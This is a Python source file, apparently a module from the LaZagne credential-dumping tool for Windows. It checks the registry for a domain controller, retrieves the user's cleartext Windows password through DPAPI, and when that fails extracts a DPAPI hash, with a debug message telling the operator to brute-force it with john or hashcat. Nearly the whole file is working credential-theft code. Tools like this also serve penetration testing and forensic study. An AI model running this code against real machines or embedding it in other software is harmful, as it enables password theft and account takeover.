# -*- coding: utf-8 -*- 
from lazagne.config.write_output import print_debug
from lazagne.config.moduleInfo import ModuleInfo
from lazagne.config.winstructure import *
from lazagne.config.constant import *
import _winreg

class WindowsPassword(ModuleInfo):
	def __init__(self):
		ModuleInfo.__init__(self, 'windows', 'windows', exec_at_end=True)

	def is_in_domain(self):
		"""
		Return the context of the host
		If a domaine controller is set we are in an active directory.
		"""
		try:
			key = OpenKey(HKEY_LOCAL_MACHINE, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\')
			val, _ 	= _winreg.QueryValueEx(key, 'DCName')
			_winreg.CloseKey(key)
			return val
		except:
			return False

	def run(self, software_name=None):
		pwdFound = []
		if constant.dpapi:
			# check password founds as windows password
			password = constant.dpapi.get_cleartext_password()
			if password:
				pwdFound.append(
					{
						'Login'		: constant.username, 
						'Password'	: password
					}
				)
			else:
				# retrieve dpapi hash used to bruteforce (hash can be retrieved without needed admin privilege)
				# method taken from Jean-Christophe Delaunay - @Fist0urs
				# https://www.synacktiv.com/ressources/univershell_2017_dpapi.pdf

				print_debug('INFO', u'Windows passwords not found.\nTry to bruteforce this hash (using john or hashcat) depending on your context (domain environment or not)')
				if constant.dpapi:
					context = 'local'
					if self.is_in_domain():
						context = 'domain'
					
					h = constant.dpapi.get_dpapi_hash(context=context)
					if h:
						pwdFound.append(
							{
								'DPAPI_Hash_{context}'.format(context=context.capitalize()) : constant.dpapi.get_dpapi_hash(context=context)
							}
						)

		return pwdFound
